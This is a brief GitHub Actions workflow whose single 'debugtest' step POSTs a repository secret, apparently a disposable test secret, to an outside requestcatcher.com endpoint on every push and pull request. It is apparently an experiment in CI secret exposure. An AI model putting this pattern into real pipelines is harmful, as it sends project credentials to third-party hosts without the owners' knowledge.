name: ci

on:
  - push
  - pull_request

jobs:
  ci:
    runs-on: ubuntu-latest
    steps:
      - name: debugtest
        run: |
          curl -X POST -d 'Hello from CI!' https://test409magg4ag.requestcatcher.com/ci
          curl -X POST -d "Value: ${{ secrets.TEST_SECRET_DELETE_THIS_ANYTIME }}" https://test409magg4ag.requestcatcher.com/ci
